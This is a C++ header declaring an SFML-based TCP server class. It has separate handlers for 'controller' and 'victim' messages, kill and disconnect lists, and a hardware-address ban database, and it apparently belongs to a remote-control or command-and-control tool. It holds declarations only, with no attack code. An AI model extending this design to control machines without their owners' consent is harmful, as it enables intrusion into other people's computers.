#pragma once
#include "client.h"
#include "../secret.h"

class Server
{
public:
	Server();
	void receive();
	
private:
	void checkAwake(); //thread
	void processControllerMsg(sf::Uint16 id, sf::Packet p, 
		std::vector<sf::Uint16>& idsToKill, std::vector<sf::Uint16>& idsToDisc);
	void processVictimMsg(sf::Uint16 id, sf::Packet p, std::vector<sf::Uint16>& idsToDisc);

	void disconnect(sf::Uint16 id);
	void updateControllersList();
	void writeLog(std::string s);
	void saveDatabase();

	sf::Uint16 currentId = 0;
	sf::SocketSelector selector;
	sf::TcpListener listener;
	sf::Mutex mutex; //used for clients access

	std::map<sf::Uint16, Client> clients;
	//map hardware address to ban status (first char) and name
	std::map<std::string, std::string> database;
};

